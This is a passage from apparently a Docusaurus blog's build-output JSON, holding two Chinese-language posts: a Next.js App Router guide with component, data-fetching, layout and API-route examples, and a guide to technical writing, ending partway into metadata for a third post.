\u5165\u95e8\u6307\u5357","permalink":"/blog/graphql-intro"},"nextItem":{"title":"\u6280\u672f\u5199\u4f5c\u6307\u5357","permalink":"/blog/tech-writing"}},"content":"Next.js 13 \u5f15\u5165\u7684 App Router \u5e26\u6765\u4e86\u5168\u65b0\u7684\u5f00\u53d1\u4f53\u9a8c\u3002\u672c\u6587\u8be6\u89e3 App Router \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf App Router vs Pages Router\\n\\n| \u7279\u6027 | Pages Router | App Router |\\n|------|-------------|------------|\\n| \u8def\u7531\u5b9a\u4e49 | `pages/` \u76ee\u5f55 | `app/` \u76ee\u5f55 |\\n| \u5e03\u5c40 | `_app.js`, `_document.js` | `layout.tsx` \u5d4c\u5957 |\\n| \u6570\u636e\u83b7\u53d6 | `getServerSideProps` \u7b49 | `async` \u7ec4\u4ef6 |\\n| \u9ed8\u8ba4\u6e32\u67d3 | \u5ba2\u6237\u7aef\u7ec4\u4ef6 | \u670d\u52a1\u7aef\u7ec4\u4ef6 |\\n| Streaming | \u4e0d\u652f\u6301 | \u652f\u6301 |\\n\\n---\\n\\n## \ud83d\udcc2 \u76ee\u5f55\u7ed3\u6784\\n\\n```\\napp/\\n\u251c\u2500\u2500 layout.tsx          # \u6839\u5e03\u5c40\\n\u251c\u2500\u2500 page.tsx            # \u9996\u9875 /\\n\u251c\u2500\u2500 loading.tsx         # \u52a0\u8f7d\u72b6\u6001\\n\u251c\u2500\u2500 error.tsx           # \u9519\u8bef\u8fb9\u754c\\n\u251c\u2500\u2500 not-found.tsx       # 404 \u9875\u9762\\n\u251c\u2500\u2500 blog/\\n\u2502   \u251c\u2500\u2500 layout.tsx      # \u535a\u5ba2\u5e03\u5c40\\n\u2502   \u251c\u2500\u2500 page.tsx        # /blog\\n\u2502   \u2514\u2500\u2500 [slug]/\\n\u2502       \u2514\u2500\u2500 page.tsx    # /blog/:slug\\n\u251c\u2500\u2500 api/\\n\u2502   \u2514\u2500\u2500 users/\\n\u2502       \u2514\u2500\u2500 route.ts    # API \u8def\u7531\\n\u2514\u2500\u2500 (marketing)/        # \u8def\u7531\u7ec4\\n    \u251c\u2500\u2500 about/\\n    \u2502   \u2514\u2500\u2500 page.tsx\\n    \u2514\u2500\u2500 contact/\\n        \u2514\u2500\u2500 page.tsx\\n```\\n\\n### \u7279\u6b8a\u6587\u4ef6\\n\\n| \u6587\u4ef6 | \u4f5c\u7528 |\\n|------|------|\\n| `page.tsx` | \u9875\u9762\u7ec4\u4ef6 |\\n| `layout.tsx` | \u5171\u4eab\u5e03\u5c40 |\\n| `loading.tsx` | \u52a0\u8f7d UI |\\n| `error.tsx` | \u9519\u8bef\u8fb9\u754c |\\n| `not-found.tsx` | 404 \u9875\u9762 |\\n| `route.ts` | API \u8def\u7531 |\\n| `template.tsx` | \u6a21\u677f\uff08\u6bcf\u6b21\u91cd\u65b0\u6302\u8f7d\uff09 |\\n\\n---\\n\\n## \ud83e\udde9 \u670d\u52a1\u7aef\u7ec4\u4ef6 vs \u5ba2\u6237\u7aef\u7ec4\u4ef6\\n\\n### \u670d\u52a1\u7aef\u7ec4\u4ef6\uff08\u9ed8\u8ba4\uff09\\n\\n```tsx\\n// app/posts/page.tsx\\n// \u9ed8\u8ba4\u662f\u670d\u52a1\u7aef\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u76f4\u63a5 async\\n\\nasync function getPosts() {\\n  const res = await fetch(\'https://api.example.com/posts\', {\\n    cache: \'no-store\', // \u52a8\u6001\u6570\u636e\\n  });\\n  return res.json();\\n}\\n\\nexport default async function PostsPage() {\\n  const posts = await getPosts();\\n\\n  return (\\n    <ul>\\n      {posts.map((post) => (\\n        <li key={post.id}>{post.title}</li>\\n      ))}\\n    </ul>\\n  );\\n}\\n```\\n\\n### \u5ba2\u6237\u7aef\u7ec4\u4ef6\\n\\n```tsx\\n\'use client\'; // \u6807\u8bb0\u4e3a\u5ba2\u6237\u7aef\u7ec4\u4ef6\\n\\nimport { useState } from \'react\';\\n\\nexport default function Counter() {\\n  const [count, setCount] = useState(0);\\n\\n  return (\\n    <button onClick={() => setCount(count + 1)}>\\n      Count: {count}\\n    </button>\\n  );\\n}\\n```\\n\\n### \u4f55\u65f6\u4f7f\u7528\u5ba2\u6237\u7aef\u7ec4\u4ef6\\n\\n```markdown\\n\u9700\u8981 \'use client\' \u7684\u573a\u666f\uff1a\\n- \u4f7f\u7528 useState, useEffect \u7b49 Hooks\\n- \u4f7f\u7528\u6d4f\u89c8\u5668 API\uff08window, document\uff09\\n- \u4e8b\u4ef6\u76d1\u542c\uff08onClick, onChange\uff09\\n- \u4f7f\u7528\u4ec5\u5ba2\u6237\u7aef\u7684\u5e93\\n```\\n\\n### \u7ec4\u5408\u6a21\u5f0f\\n\\n```tsx\\n// app/dashboard/page.tsx (\u670d\u52a1\u7aef)\\nimport Counter from \'./Counter\'; // \u5ba2\u6237\u7aef\u7ec4\u4ef6\\n\\nasync function getData() {\\n  const res = await fetch(\'...\');\\n  return res.json();\\n}\\n\\nexport default async function Dashboard() {\\n  const data = await getData();\\n\\n  return (\\n    <div>\\n      <h1>Dashboard</h1>\\n      <p>Server data: {data.value}</p>\\n      <Counter /> {/* \u5ba2\u6237\u7aef\u7ec4\u4ef6 */}\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcca \u6570\u636e\u83b7\u53d6\\n\\n### \u670d\u52a1\u7aef\u83b7\u53d6\\n\\n```tsx\\n// \u9759\u6001\u6570\u636e\uff08\u6784\u5efa\u65f6\u83b7\u53d6\uff09\\nasync function getStaticData() {\\n  const res = await fetch(\'https://api.example.com/data\', {\\n    cache: \'force-cache\', // \u9ed8\u8ba4\\n  });\\n  return res.json();\\n}\\n\\n// \u52a8\u6001\u6570\u636e\uff08\u6bcf\u6b21\u8bf7\u6c42\uff09\\nasync function getDynamicData() {\\n  const res = await fetch(\'https://api.example.com/data\', {\\n    cache: \'no-store\',\\n  });\\n  return res.json();\\n}\\n\\n// \u5b9a\u65f6\u91cd\u65b0\u9a8c\u8bc1\\nasync function getRevalidatedData() {\\n  const res = await fetch(\'https://api.example.com/data\', {\\n    next: { revalidate: 3600 }, // \u6bcf\u5c0f\u65f6\\n  });\\n  return res.json();\\n}\\n```\\n\\n### \u5e76\u884c\u6570\u636e\u83b7\u53d6\\n\\n```tsx\\nexport default async function Page() {\\n  // \u5e76\u884c\u83b7\u53d6\uff0c\u4e0d\u963b\u585e\\n  const [user, posts] = await Promise.all([\\n    getUser(),\\n    getPosts(),\\n  ]);\\n\\n  return (\\n    <div>\\n      <UserProfile user={user} />\\n      <PostList posts={posts} />\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u5e03\u5c40\u7cfb\u7edf\\n\\n### \u6839\u5e03\u5c40\\n\\n```tsx\\n// app/layout.tsx\\nimport { Inter } from \'next/font/google\';\\nimport \'./globals.css\';\\n\\nconst inter = Inter({ subsets: [\'latin\'] });\\n\\nexport const metadata = {\\n  title: \'My App\',\\n  description: \'App description\',\\n};\\n\\nexport default function RootLayout({\\n  children,\\n}: {\\n  children: React.ReactNode;\\n}) {\\n  return (\\n    <html lang=\\"zh-CN\\">\\n      <body className={inter.className}>\\n        <header>Header</header>\\n        <main>{children}</main>\\n        <footer>Footer</footer>\\n      </body>\\n    </html>\\n  );\\n}\\n```\\n\\n### \u5d4c\u5957\u5e03\u5c40\\n\\n```tsx\\n// app/blog/layout.tsx\\nexport default function BlogLayout({\\n  children,\\n}: {\\n  children: React.ReactNode;\\n}) {\\n  return (\\n    <div className=\\"blog-layout\\">\\n      <aside>Sidebar</aside>\\n      <article>{children}</article>\\n    </div>\\n  );\\n}\\n```\\n\\n### \u8def\u7531\u7ec4\\n\\n```\\napp/\\n\u251c\u2500\u2500 (marketing)/      # \u4e0d\u5f71\u54cd URL\\n\u2502   \u251c\u2500\u2500 layout.tsx    # \u8425\u9500\u9875\u5e03\u5c40\\n\u2502   \u251c\u2500\u2500 about/\\n\u2502   \u2514\u2500\u2500 contact/\\n\u2514\u2500\u2500 (dashboard)/\\n    \u251c\u2500\u2500 layout.tsx    # \u4eea\u8868\u76d8\u5e03\u5c40\\n    \u251c\u2500\u2500 settings/\\n    \u2514\u2500\u2500 profile/\\n```\\n\\n---\\n\\n## \u23f3 Loading \u548c Error\\n\\n### Loading UI\\n\\n```tsx\\n// app/blog/loading.tsx\\nexport default function Loading() {\\n  return (\\n    <div className=\\"loading\\">\\n      <div className=\\"spinner\\" />\\n      <p>Loading...</p>\\n    </div>\\n  );\\n}\\n```\\n\\n### Error \u8fb9\u754c\\n\\n```tsx\\n\'use client\';\\n\\n// app/blog/error.tsx\\nexport default function Error({\\n  error,\\n  reset,\\n}: {\\n  error: Error & { digest?: string };\\n  reset: () => void;\\n}) {\\n  return (\\n    <div className=\\"error\\">\\n      <h2>Something went wrong!</h2>\\n      <p>{error.message}</p>\\n      <button onClick={reset}>Try again</button>\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd0c API \u8def\u7531\\n\\n```tsx\\n// app/api/users/route.ts\\nimport { NextRequest, NextResponse } from \'next/server\';\\n\\nexport async function GET(request: NextRequest) {\\n  const users = await db.users.findMany();\\n  return NextResponse.json(users);\\n}\\n\\nexport async function POST(request: NextRequest) {\\n  const body = await request.json();\\n  const user = await db.users.create({ data: body });\\n  return NextResponse.json(user, { status: 201 });\\n}\\n\\n// \u52a8\u6001\u8def\u7531\u53c2\u6570\\n// app/api/users/[id]/route.ts\\nexport async function GET(\\n  request: NextRequest,\\n  { params }: { params: { id: string } }\\n) {\\n  const user = await db.users.findUnique({\\n    where: { id: params.id },\\n  });\\n  \\n  if (!user) {\\n    return NextResponse.json(\\n      { error: \'User not found\' },\\n      { status: 404 }\\n    );\\n  }\\n  \\n  return NextResponse.json(user);\\n}\\n```\\n\\n---\\n\\n## \ud83d\ude80 Server Actions\\n\\n```tsx\\n// app/posts/actions.ts\\n\'use server\';\\n\\nimport { revalidatePath } from \'next/cache\';\\n\\nexport async function createPost(formData: FormData) {\\n  const title = formData.get(\'title\') as string;\\n  const content = formData.get(\'content\') as string;\\n\\n  await db.posts.create({\\n    data: { title, content },\\n  });\\n\\n  revalidatePath(\'/posts\');\\n}\\n\\n// app/posts/new/page.tsx\\nimport { createPost } from \'../actions\';\\n\\nexport default function NewPost() {\\n  return (\\n    <form action={createPost}>\\n      <input name=\\"title\\" placeholder=\\"Title\\" />\\n      <textarea name=\\"content\\" placeholder=\\"Content\\" />\\n      <button type=\\"submit\\">Create</button>\\n    </form>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u9ed8\u8ba4\u4f7f\u7528\u670d\u52a1\u7aef\u7ec4\u4ef6\\n2. \u53ea\u5728\u5fc5\u8981\u65f6\u4f7f\u7528 \'use client\'\\n3. \u5ba2\u6237\u7aef\u7ec4\u4ef6\u653e\u5728\u7ec4\u4ef6\u6811\u5e95\u90e8\\n4. \u4f7f\u7528 loading.tsx \u4f18\u5316\u52a0\u8f7d\u4f53\u9a8c\\n5. \u5408\u7406\u4f7f\u7528\u7f13\u5b58\u7b56\u7565\\n6. \u4f7f\u7528 Server Actions \u5904\u7406\u8868\u5355\\n```\\n\\n---\\n\\nApp Router \u662f Next.js \u7684\u672a\u6765\u65b9\u5411\uff0c\u503c\u5f97\u6df1\u5165\u5b66\u4e60\u548c\u5b9e\u8df5\u3002"},{"id":"tech-writing","metadata":{"permalink":"/blog/tech-writing","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-10-10-tech-writing.md","source":"@site/blog/2024-10-10-tech-writing.md","title":"\u6280\u672f\u5199\u4f5c\u6307\u5357","description":"\u6280\u672f\u5199\u4f5c\u662f\u5206\u4eab\u77e5\u8bc6\u3001\u5efa\u7acb\u5f71\u54cd\u529b\u7684\u91cd\u8981\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab\u6280\u672f\u6587\u7ae0\u7684\u5199\u4f5c\u65b9\u6cd5\u548c\u6280\u5de7\u3002","date":"2024-10-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u5199\u4f5c","permalink":"/blog/tags/\u5199\u4f5c"},{"inline":true,"label":"\u6587\u6863","permalink":"/blog/tags/\u6587\u6863"},{"inline":true,"label":"\u535a\u5ba2","permalink":"/blog/tags/\u535a\u5ba2"}],"readingTime":3.79,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"tech-writing","title":"\u6280\u672f\u5199\u4f5c\u6307\u5357","authors":"mason","tags":["\u5199\u4f5c","\u6587\u6863","\u535a\u5ba2"]},"unlisted":false,"prevItem":{"title":"Next.js App Router \u5b9e\u6218\u6307\u5357","permalink":"/blog/nextjs-app-router"},"nextItem":{"title":"Node.js \u547d\u4ee4\u884c\u5de5\u5177\u5f00\u53d1\u6307\u5357","permalink":"/blog/nodejs-cli"}},"content":"\u6280\u672f\u5199\u4f5c\u662f\u5206\u4eab\u77e5\u8bc6\u3001\u5efa\u7acb\u5f71\u54cd\u529b\u7684\u91cd\u8981\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab\u6280\u672f\u6587\u7ae0\u7684\u5199\u4f5c\u65b9\u6cd5\u548c\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u8981\u6280\u672f\u5199\u4f5c\\n\\n| \u6536\u76ca | \u8bf4\u660e |\\n|------|------|\\n| \u52a0\u6df1\u7406\u89e3 | \u5199\u4f5c\u662f\u6700\u597d\u7684\u5b66\u4e60\u65b9\u5f0f |\\n| \u5efa\u7acb\u5f71\u54cd\u529b | \u5c55\u793a\u4e13\u4e1a\u80fd\u529b |\\n| \u5e2e\u52a9\u4ed6\u4eba | \u56de\u9988\u793e\u533a |\\n| \u804c\u4e1a\u53d1\u5c55 | \u7b80\u5386\u52a0\u5206 |\\n| \u6c89\u6dc0\u77e5\u8bc6 | \u4e2a\u4eba\u77e5\u8bc6\u5e93 |\\n\\n---\\n\\n## \ud83d\udcdd \u5199\u4f5c\u7c7b\u578b\\n\\n### 1. \u6559\u7a0b\u7c7b\\n\\n```markdown\\n\u7279\u70b9\uff1a\u4ece\u96f6\u5f00\u59cb\uff0cstep by step\\n\u7ed3\u6784\uff1a\\n- \u76ee\u6807\uff08\u8bfb\u8005\u80fd\u5b66\u5230\u4ec0\u4e48\uff09\\n- \u524d\u7f6e\u6761\u4ef6\\n- \u8be6\u7ec6\u6b65\u9aa4\\n- \u5b8c\u6574\u4ee3\u7801\\n- \u5e38\u89c1\u95ee\u9898\\n\\n\u9002\u5408\uff1a\u65b0\u6280\u672f\u5165\u95e8\u3001\u5de5\u5177\u4f7f\u7528\\n```\\n\\n### 2. \u539f\u7406\u89e3\u6790\\n\\n```markdown\\n\u7279\u70b9\uff1a\u6df1\u5165\u5e95\u5c42\uff0c\u8bb2\u6e05\u695a why\\n\u7ed3\u6784\uff1a\\n- \u95ee\u9898\u80cc\u666f\\n- \u6838\u5fc3\u6982\u5ff5\\n- \u5b9e\u73b0\u539f\u7406\\n- \u6e90\u7801\u5206\u6790\\n- \u603b\u7ed3\\n\\n\u9002\u5408\uff1a\u6846\u67b6\u539f\u7406\u3001\u7b97\u6cd5\u89e3\u6790\\n```\\n\\n### 3. \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n\u7279\u70b9\uff1a\u7ecf\u9a8c\u603b\u7ed3\uff0c\u5b9e\u7528\u5bfc\u5411\\n\u7ed3\u6784\uff1a\\n- \u573a\u666f\u63cf\u8ff0\\n- \u5e38\u89c1\u95ee\u9898\\n- \u89e3\u51b3\u65b9\u6848\u5bf9\u6bd4\\n- \u63a8\u8350\u505a\u6cd5\\n- \u6ce8\u610f\u4e8b\u9879\\n\\n\u9002\u5408\uff1a\u6027\u80fd\u4f18\u5316\u3001\u67b6\u6784\u8bbe\u8ba1\\n```\\n\\n### 4. \u8e29\u5751\u8bb0\u5f55\\n\\n```markdown\\n\u7279\u70b9\uff1a\u95ee\u9898\u9a71\u52a8\uff0c\u89e3\u51b3\u65b9\u6848\\n\u7ed3\u6784\uff1a\\n- \u95ee\u9898\u63cf\u8ff0\\n- \u6392\u67e5\u8fc7\u7a0b\\n- \u6839\u56e0\u5206\u6790\\n- \u89e3\u51b3\u65b9\u6848\\n- \u9884\u9632\u63aa\u65bd\\n\\n\u9002\u5408\uff1aBug \u4fee\u590d\u3001\u7ebf\u4e0a\u6545\u969c\\n```\\n\\n---\\n\\n## \u270d\ufe0f \u5199\u4f5c\u6d41\u7a0b\\n\\n### 1. \u9009\u9898\\n\\n```markdown\\n\u597d\u9009\u9898\u7684\u7279\u5f81\uff1a\\n- \u4f60\u771f\u6b63\u7406\u89e3\u7684\u5185\u5bb9\\n- \u6709\u4e00\u5b9a\u641c\u7d22\u91cf\\n- \u73b0\u6709\u8d44\u6599\u4e0d\u591f\u597d\\n- \u4f60\u6709\u72ec\u7279\u89c1\u89e3\\n\\n\u9009\u9898\u6765\u6e90\uff1a\\n- \u5de5\u4f5c\u4e2d\u7684\u95ee\u9898\\n- \u5b66\u4e60\u65b0\u6280\u672f\\n- \u8bfb\u4e66\u7b14\u8bb0\\n- \u70ed\u95e8\u8bdd\u9898\\n```\\n\\n### 2. \u5927\u7eb2\\n\\n```markdown\\n\u5148\u5199\u5927\u7eb2\u518d\u5199\u5185\u5bb9\uff1a\\n1. \u786e\u5b9a\u6838\u5fc3\u89c2\u70b9\\n2. \u5217\u51fa\u4e3b\u8981\u7ae0\u8282\\n3. \u6bcf\u7ae0\u8981\u70b9\\n4. \u9884\u4f30\u7bc7\u5e45\\n\\n\u793a\u4f8b\uff1a\\n- \u5f15\u8a00\uff08200\u5b57\uff09\\n  - \u95ee\u9898\u80cc\u666f\\n  - \u6587\u7ae0\u76ee\u6807\\n- \u6838\u5fc3\u5185\u5bb9\uff082000\u5b57\uff09\\n  - \u6982\u5ff5\u89e3\u91ca\\n  - \u4ee3\u7801\u793a\u4f8b\\n  - \u5bf9\u6bd4\u5206\u6790\\n- \u603b\u7ed3\uff08200\u5b57\uff09\\n```\\n\\n### 3. \u521d\u7a3f\\n\\n```markdown\\n\u5feb\u901f\u5199\u5b8c\uff0c\u4e0d\u8981\u8ffd\u6c42\u5b8c\u7f8e\uff1a\\n- \u6309\u5927\u7eb2\u586b\u5145\u5185\u5bb9\\n- \u4ee3\u7801\u53ef\u4ee5\u5148\u5199\u4f2a\u4ee3\u7801\\n- \u4e0d\u786e\u5b9a\u7684\u5730\u65b9\u6807\u8bb0 TODO\\n- \u4e00\u6b21\u6027\u5199\u5b8c\uff0c\u4e0d\u8981\u4e2d\u65ad\\n```\\n\\n### 4. \u4fee\u6539\\n\\n```markdown\\n\u81f3\u5c11\u4fee\u6539\u4e24\u904d\uff1a\\n\\n\u7b2c\u4e00\u904d\uff08\u7ed3\u6784\uff09\uff1a\\n- \u903b\u8f91\u662f\u5426\u6e05\u6670\\n- \u5185\u5bb9\u662f\u5426\u5b8c\u6574\\n- \u662f\u5426\u6709\u91cd\u590d\\n\\n\u7b2c\u4e8c\u904d\uff08\u7ec6\u8282\uff09\uff1a\\n- \u6587\u5b57\u901a\u987a\\n- \u4ee3\u7801\u6b63\u786e\\n- \u683c\u5f0f\u89c4\u8303\\n```\\n\\n---\\n\\n## \ud83d\udca1 \u5199\u4f5c\u6280\u5de7\\n\\n### 1. \u5f00\u5934\u5438\u5f15\u4eba\\n\\n```markdown\\n\u274c \u4e0d\u597d\u7684\u5f00\u5934\uff1a\\n\\"\u672c\u6587\u4ecb\u7ecd React \u6027\u80fd\u4f18\u5316\\"\\n\\n\u2705 \u597d\u7684\u5f00\u5934\uff1a\\n\\"\u4e0a\u5468\u6211\u4eec\u7684 React \u5e94\u7528\u9996\u5c4f\u52a0\u8f7d\u9700\u8981 8 \u79d2\uff0c\u7528\u6237\u6d41\u5931\u4e25\u91cd\u3002\\n\u901a\u8fc7\u4e00\u7cfb\u5217\u4f18\u5316\uff0c\u6211\u4eec\u5c06\u52a0\u8f7d\u65f6\u95f4\u964d\u5230\u4e86 2 \u79d2\u4ee5\u5185\u3002\\n\u8fd9\u7bc7\u6587\u7ae0\u5206\u4eab\u6211\u4eec\u7684\u4f18\u5316\u8fc7\u7a0b\u548c\u7ecf\u9a8c\u3002\\"\\n```\\n\\n### 2. \u4f7f\u7528\u4f8b\u5b50\\n\\n```markdown\\n\u274c \u62bd\u8c61\u89e3\u91ca\uff1a\\n\\"useMemo \u7528\u4e8e\u7f13\u5b58\u8ba1\u7b97\u7ed3\u679c\\"\\n\\n\u2705 \u5177\u4f53\u4f8b\u5b50\uff1a\\n\\"\u5047\u8bbe\u4f60\u6709\u4e00\u4e2a\u5217\u8868\u9700\u8981\u8fc7\u6ee4\uff0c\u6bcf\u6b21\u6e32\u67d3\u90fd\u91cd\u65b0\u8fc7\u6ee4\uff1a\\n\\nconst filtered = items.filter(item => item.active);\\n\\n\u5982\u679c items \u6709 10000 \u6761\uff0c\u6bcf\u6b21\u6e32\u67d3\u90fd\u4f1a\u904d\u5386 10000 \u6b21\u3002\\n\\n\u4f7f\u7528 useMemo \u7f13\u5b58\u7ed3\u679c\uff0c\u53ea\u5728 items \u53d8\u5316\u65f6\u91cd\u65b0\u8ba1\u7b97\uff1a\\n\\nconst filtered = useMemo(\\n  () => items.filter(item => item.active),\\n  [items]\\n);\\"\\n```\\n\\n### 3. \u5bf9\u6bd4\u8bf4\u660e\\n\\n```markdown\\n| \u65b9\u6848 | \u4f18\u70b9 | \u7f3a\u70b9 | \u9002\u7528\u573a\u666f |\\n|------|------|------|----------|\\n| Context | \u7b80\u5355 | \u6027\u80fd\u95ee\u9898 | \u4f4e\u9891\u66f4\u65b0 |\\n| Redux | \u5b8c\u5584 | \u6837\u677f\u591a | \u5927\u578b\u9879\u76ee |\\n| Zustand | \u8f7b\u91cf | \u751f\u6001\u5c11 | \u4e2d\u5c0f\u9879\u76ee |\\n```\\n\\n### 4. \u53ef\u89c6\u5316\\n\\n```markdown\\n\u4f7f\u7528\u56fe\u8868\u8bf4\u660e\uff1a\\n- \u67b6\u6784\u56fe\\n- \u6d41\u7a0b\u56fe\\n- \u65f6\u5e8f\u56fe\\n- \u6027\u80fd\u5bf9\u6bd4\u56fe\\n\\n\u5de5\u5177\u63a8\u8350\uff1a\\n- draw.io\\n- Excalidraw\\n- Mermaid\\n```\\n\\n### 5. \u4ee3\u7801\u89c4\u8303\\n\\n```javascript\\n// \u2705 \u597d\u7684\u4ee3\u7801\u793a\u4f8b\\n// 1. \u6709\u6ce8\u91ca\u8bf4\u660e\\n// 2. \u7a81\u51fa\u91cd\u70b9\\n// 3. \u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\\n\\n// \u521b\u5efa\u9632\u6296\u51fd\u6570\\nfunction debounce(fn, delay) {\\n  let timer = null;\\n  \\n  return function (...args) {\\n    // \u6e05\u9664\u4e4b\u524d\u7684\u5b9a\u65f6\u5668\\n    clearTimeout(timer);\\n    \\n    // \u8bbe\u7f6e\u65b0\u7684\u5b9a\u65f6\u5668\\n    timer = setTimeout(() => {\\n      fn.apply(this, args);\\n    }, delay);\\n  };\\n}\\n\\n// \u4f7f\u7528\u793a\u4f8b\\nconst debouncedSearch = debounce(search, 300);\\ninput.addEventListener(\'input\', debouncedSearch);\\n```\\n\\n---\\n\\n## \ud83d\udcd0 \u6587\u7ae0\u7ed3\u6784\\n\\n### \u6807\u51c6\u7ed3\u6784\\n\\n```markdown\\n# \u6807\u9898\\n\\n\u4e00\u53e5\u8bdd\u8bf4\u660e\u672c\u6587\u5185\u5bb9\u548c\u4ef7\u503c\\n\\n## \u80cc\u666f/\u95ee\u9898\\n\u4e3a\u4ec0\u4e48\u5199\u8fd9\u7bc7\u6587\u7ae0\\n\\n## \u6838\u5fc3\u5185\u5bb9\\n### \u6982\u5ff51\\n### \u6982\u5ff52\\n### \u6982\u5ff53\\n\\n## \u5b9e\u8df5/\u793a\u4f8b\\n\u5b8c\u6574\u7684\u4ee3\u7801\u793a\u4f8b\\n\\n## \u603b\u7ed3\\n- \u8981\u70b9\u56de\u987e\\n- \u63a8\u8350\u505a\u6cd5\\n- \u5ef6\u4f38\u9605\u8bfb\\n```\\n\\n### \u957f\u6587\u7ae0\u5bfc\u822a\\n\\n```markdown\\n## \u76ee\u5f55\\n- [\u80cc\u666f](#\u80cc\u666f)\\n- [\u6838\u5fc3\u6982\u5ff5](#\u6838\u5fc3\u6982\u5ff5)\\n- [\u5b9e\u8df5\u793a\u4f8b](#\u5b9e\u8df5\u793a\u4f8b)\\n- [\u603b\u7ed3](#\u603b\u7ed3)\\n\\n## TL;DR\\n\u5982\u679c\u4f60\u8d76\u65f6\u95f4\uff0c\u8fd9\u662f\u8981\u70b9\uff1a\\n1. \u8981\u70b9\u4e00\\n2. \u8981\u70b9\u4e8c\\n3. \u8981\u70b9\u4e09\\n```\\n\\n---\\n\\n## \u2705 \u68c0\u67e5\u6e05\u5355\\n\\n### \u53d1\u5e03\u524d\u68c0\u67e5\\n\\n```markdown\\n\u5185\u5bb9\uff1a\\n- [ ] \u6807\u9898\u6e05\u6670\u5438\u5f15\\n- [ ] \u5f00\u5934\u8bf4\u660e\u4ef7\u503c\\n- [ ] \u903b\u8f91\u7ed3\u6784\u6e05\u6670\\n- [ ] \u6709\u4ee3\u7801\u793a\u4f8b\\n- [ ] \u6709\u603b\u7ed3\\n\\n\u683c\u5f0f\uff1a\\n- [ ] \u4ee3\u7801\u683c\u5f0f\u6b63\u786e\\n- [ ] \u56fe\u7247\u53ef\u4ee5\u663e\u793a\\n- [ ] \u94fe\u63a5\u6709\u6548\\n- [ ] \u65e0\u9519\u522b\u5b57\\n\\n\u5143\u4fe1\u606f\uff1a\\n- [ ] \u5408\u9002\u7684\u6807\u7b7e\\n- [ ] \u5c01\u9762\u56fe\u7247\\n- [ ] \u6458\u8981\u63cf\u8ff0\\n```\\n\\n---\\n\\n## \ud83d\udcca \u8861\u91cf\u6548\u679c\\n\\n### \u5173\u6ce8\u6307\u6807\\n\\n```markdown\\n\u6570\u91cf\uff1a\u9605\u8bfb\u91cf\u3001\u6536\u85cf\u3001\u70b9\u8d5e\\n\u8d28\u91cf\uff1a\u8bc4\u8bba\u3001\u5f15\u7528\\n\u8f6c\u5316\uff1a\u5173\u6ce8\u3001\u8ba2\u9605\\n```\\n\\n### \u6301\u7eed\u6539\u8fdb\\n\\n```markdown\\n- \u5206\u6790\u9ad8\u70ed\u5ea6\u6587\u7ae0\u7279\u70b9\\n- \u6536\u96c6\u8bfb\u8005\u53cd\u9988\\n- \u8ddf\u8e2a\u6280\u672f\u8d8b\u52bf\\n- \u5b9a\u671f\u590d\u76d8\u603b\u7ed3\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5de5\u5177\u63a8\u8350\\n\\n| \u7528\u9014 | \u5de5\u5177 |\\n|------|------|\\n| \u5199\u4f5c | VS Code, Typora, Notion |\\n| \u753b\u56fe | draw.io, Excalidraw |\\n| \u622a\u56fe | CleanShot X, Snipaste |\\n| \u4ee3\u7801\u56fe | Carbon, ray.so |\\n| \u53d1\u5e03 | \u6398\u91d1, \u77e5\u4e4e, GitHub |\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- \u300a\u6280\u672f\u5199\u4f5c\u624b\u518c\u300b\\n- [Google \u6280\u672f\u5199\u4f5c\u8bfe\u7a0b](https://developers.google.com/tech-writing)\\n- [\u5199\u4f5c\u5de5\u5177](https://www.thewritingtools.com/)\\n\\n---\\n\\n\u5199\u4f5c\u662f\u4e00\u9879\u9700\u8981\u7ec3\u4e60\u7684\u6280\u80fd\u3002\u4ece\u7b80\u5355\u7684\u7b14\u8bb0\u5f00\u59cb\uff0c\u575a\u6301\u8f93\u51fa\uff0c\u4f60\u4f1a\u8d8a\u5199\u8d8a\u597d\u3002\\n\\n**\u6700\u91cd\u8981\u7684\u662f\uff1a\u5f00\u59cb\u5199\uff01**"},{"id":"nodejs-cli","metadata":{"permalink":"/blog/nodejs-cli","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-10-01-nodejs-cli.md","source":"@site/blog/2024-10-01-nodejs-cli.md","title":"Node.js \u547d\u4ee4\u884c\u5de5\u5177\u5f00\u53d1\u6307\u5357","description":"\u5f00\u53d1\u547d\u4ee4\u884c\u5de5\u5177\u80fd\u591f\u81ea\u52a8\u5316\u91cd\u590d\u5de5\u4f5c\uff0c\u63d0\u5347\u6548\u7387\u3002\u672c\u6587\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528 Node.js \u5f00\u53d1 CLI \u5de5\u5177\u3002","date":"2024-10-01T00:00:00.000Z","tags":[{"inline":true,"label":"Node.js","permalink":"/blog/tags/node-js"},{"inline":true,"label":"CLI","permalink":"/blog/tags/cli"},{"inline":true,"label":"\u5de5\u5177","permalink":"/blog/tags/\u5de5\u5177"}],"readingTime":5.21,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"nodejs-cli","title":"Node.js 